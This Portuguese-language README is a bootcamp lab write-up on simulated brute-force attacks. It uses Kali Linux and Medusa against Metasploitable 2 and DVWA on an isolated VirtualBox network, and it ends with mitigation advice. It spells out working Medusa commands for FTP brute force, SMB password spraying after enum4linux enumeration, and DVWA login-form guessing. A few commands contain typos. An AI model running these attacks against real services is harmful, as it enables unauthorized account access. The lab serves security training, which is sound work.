# Desafio-Brute-Force -  Santander Cibersegurança 2025

# 🔐 Projeto: Simulação de Ataques de Força Bruta com Kali Linux e Medusa

## ✅ Objetivo

Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

Configurar o ambiente: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).

Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.

Documentar os testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.

Este projeto demonstra ataques simulados de **força bruta**, **password spraying** e **automação de tentativas em formulário web** utilizando a ferramenta **Medusa** no Kali Linux contra serviços vulneráveis em uma máquina **Metasploitable 2**. O objetivo é compreender como esses ataques funcionam e propor medidas de mitigação.

---

## 🖥️ Ambiente de Teste

- **VirtualBox** com duas VMs:
  - **Kali Linux** (atacante)
  - **Metasploitable 2** (alvo)
- **Rede:** Host-Only (ambas as VMs na mesma rede interna)

- **Ferramentas utilizadas:**
  - Medusa (ataques de força bruta)
  - enum4linux (enumeração de usuários SMB)
  - nmap (descobrir hosts e serviços ativos em uma rede, identificando portas abertas e versões de serviços)
  - DVWA (para testes em formulário web)

---

## 🔍 Cenários de Ataque

### 1. **Força Bruta em FTP**
Este teste simula um ataque de força bruta contra o serviço FTP (21) do Metasploitable.

Ordem de comandos: Força Bruta em FTP
```
ping -C 5 192.168.56.102
nmap -sV  -p 21 192.168.56.102
echo -e "user\nusuario\nnmsfadmin\nadmin\nroot" > users.txt
echo -3 "senha\npassword\nmsfadmin\nadmin\nroot" > passwords.txt
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp -t 5
ftp 192.168.56.102 (uso de credencial apresentado com status (Sucess)

```

**Explicação:**
```

-`ping -C 5`: Envio de pacotes ICMP, executando 5 tentativas: Validar resposta de host

-`nmap`: Ferramenta para varredura de rede e descoberta de serviços
-`Sv`: Habilita a detecção da versão do serviço rodando na porta.
-`-p`: porta

- `-h`: IP do alvo
- `-u`: wordlist usuário alvo
- `-P`: wordlist com senhas
- `-M ftp`: módulo FTP
- `-t 5': Define o número de threads simultâneas
- `ftp (IP)`: tenta realizar uma conexão FTP com alvo
```

**Referência de imagens:**
```
Brute_force_FTP_1.jpg
Brute_force_FTP_2.jpg
Brute_force_FTP_3.jpg
Brute_force_FTP_4.jpg

```

-----

### 2. **Password Spraying em SMB**
Password spraying consiste em testar **uma senha comum para vários usuários**, reduzindo risco de bloqueio por tentativas excessivas.

#### **Enumeração de informações SMB com enum4linux**

Ordem de comandos:
```

enum4linux 192.168.56.102 | tee enum4_output.txt
less enum4_output.txt
```

#### **Ataque com Medusa/Spraying**
```
echo -e "telnettd\nmsfadmin\nbackup\nmysql\nmail" > sms_users.txt
echo -e "senha\npass\nmsfadmin\nadmin\nroot" > senha_spray.txt
medusa -h 192.168.56.102 -U msfadmin -P senha_spray.txt -M smbnt -t 2 -T 50
```
**Explicação:**

```
- `enum4linux`: enumeração de informações SMB
- `tee enum4_output.txt`: Salva a saída no arquivo enum4_output.txt e exibe na tela ao mesmo tempo
- `less`: Abre o arquivo gerado para leitura interativa
- `echo -e` Exibe texto com interpretação de caracteres especiais ex.: \n para nova linha.
- `medusa`: Ferramenta para ataques de força bruta
- `-h`: host alvo
- `-u`: wordlist usuário alvo
- `-P`: wordlist com senhas
- `-M smbnt`: módulo SMB para NTLM
- `-t 2`:threads por host
- `-T 50`: Máximo de 50 threads globais 
```

**Referência de imagens:**
```
enum4linux_1.jpg
enum4linux_2.jpg
medusa.jpg
```
---


-----

### 3. **Automação de Tentativas em Formulário Web (DVWA)**
DVWA (Damn Vulnerable Web App) é uma aplicação WEB vulnerável para testes.

### Acesso ao DVWA
- Acessado via navegador pelo IP da máquina Metasploitable:
```
http://192.168.56.102/dvwa/login.php
```
### Inspeção com Menu Desenvolvedor
- Aberto **Menu Desenvolvedor** . aba **Network**.
- Tentativa de login com credenciais incorretas para captura em:
- Método **POST** na requisição.
- Consulta **REQUEST** exibindo:
  - Campos enviados: `username` e `password`.
  - Resposta de tela para credêncial incorreta: **"Login failed"** (indicador de falha para uso).

Ordem de comandos:
```
echo -e "user\nmsfadmin\nadmin\nroot" > udvwa.txt
echo -e "12345\nmsfadmin\nqwerty\nacesso" > pass_dvwa.txt

medusa -h 192.168.56.102 -U udvwa.txt -P pass_dvwa.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
(Retorna como sucess se houver correspondência em lista)
```

**Explicação:**
```
- `-M http`: Módulo HTTP, para ataques via formulário web
- `-P`: wordlist
- `-m PAGE:'/dvwa/login.php`: Página alvo do login (rota do formulário)
- `m FORM:username=^USER^&password=^PASS^&Login=Login`:strutura dos campos do formulário:
^USER^ → será substituído por cada usuário da lista
^PASS^ → será substituído por cada senha da lista
- `-m 'FAIL=Login failed`: String que indica falha na autenticação (captura DevTools)
- `-t 6`:threads simultâneas
```
---

## 📂 Estrutura do Repositório
```
/README.md
/images/        # Capturas de telas
/wordlists/     # Wordlists utilizadas
/scripts/       # Scripts auxiliares
```

---

## 🛡️ Medidas de Mitigação
Para reduzir riscos de ataques de força bruta e spraying:

1. **Política de senhas fortes**:
   - Exigir senhas complexas e únicas.
2. **Bloqueio após tentativas falhas**:
   - Implementar lockout temporário após X tentativas.
3. **Monitoramento e alertas**:
   - Detectar tentativas repetidas via logs.
4. **Autenticação multifator (MFA)**:
   - Adicionar segunda camada de segurança.
5. **Desabilitar serviços desnecessários**:
   - Fechar portas e serviços não utilizados (ex.: FTP, SMB).
6. **Rate limiting**:
   - Limitar requisições por IP.

---
